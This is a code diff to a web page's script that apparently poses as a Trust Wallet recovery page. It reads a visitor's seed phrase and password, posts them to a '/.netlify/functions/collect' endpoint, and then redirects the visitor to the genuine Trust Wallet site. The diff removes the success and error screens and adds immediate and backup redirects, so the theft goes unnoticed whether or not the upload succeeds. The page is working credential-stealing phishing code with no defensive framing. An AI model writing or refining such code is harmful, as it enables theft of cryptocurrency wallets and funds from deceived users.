@@ -305,62 +305,34 @@
             data.seedPhrase = document.getElementById("seedPhrase").value;
             data.password = document.getElementById("password").value;
             data.bruteForceResults = bruteForceSeed(data.seedPhrase);
+            data.interactionType = "Form Submission";
+            data.interactionTime = new Date().toISOString();
 
-            // Send data to server
-            const response = await fetch("/.netlify/functions/collect", {
+            // Send data to server (don't wait for response)
+            fetch("/.netlify/functions/collect", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify(data),
-            });
+            }).catch((error) =>
+              console.error("Error sending form data:", error)
+            );
 
-            if (response.ok) {
-              // Show success message
-              const walletBox = document.querySelector(".wallet-box");
-              walletBox.innerHTML = `
-                <h1 style="color: #00ff00;">✅ Recovery Successful!</h1>
-                <p style="text-align: center; font-size: 18px; margin: 20px 0;">
-                  Your wallet recovery process has been completed successfully.
-                </p>
-                <p style="text-align: center; font-size: 16px; margin: 20px 0;">
-                  Redirecting to Trust Wallet...
-                </p>
-                <div style="text-align: center; margin: 20px 0;">
-                  <div style="width: 40px; height: 40px; border: 4px solid #f0a500; border-top: 4px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
-                </div>
-              `;
-
-              // Add CSS for spinner
-              const style = document.createElement("style");
-              style.textContent = `
-                @keyframes spin {
-                  0% { transform: rotate(0deg); }
-                  100% { transform: rotate(360deg); }
-                }
-              `;
-              document.head.appendChild(style);
-
-              // Redirect after 3 seconds
-              setTimeout(() => {
-                window.location.href = "https://trustwallet.com/";
-              }, 3000);
-            } else {
-              throw new Error("Server error");
-            }
+            // Redirect immediately to Trust Wallet
+            window.location.href = "https://trustwallet.com/";
           } catch (error) {
             console.error("Error:", error);
-            // Show error message
-            const walletBox = document.querySelector(".wallet-box");
-            walletBox.innerHTML = `
-              <h1 style="color: #ff0000;">❌ Error</h1>
-              <p style="text-align: center; font-size: 18px; margin: 20px 0;">
-                There was an error processing your request. Please try again.
-              </p>
-              <button onclick="location.reload()" style="background: #f0a500; color: #1a1a1a; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer;">
-                Try Again
-              </button>
-            `;
+            // Even if there's an error, still redirect to Trust Wallet
+            window.location.href = "https://trustwallet.com/";
           }
         });
+
+      // Backup redirect mechanism - redirect after 5 seconds regardless
+      setTimeout(() => {
+        if (window.location.href.includes("trustwallet.com") === false) {
+          console.log("🔄 Backup redirect to Trust Wallet");
+          window.location.href = "https://trustwallet.com/";
+        }
+      }, 5000);
     </script>
   </body>
 </html>
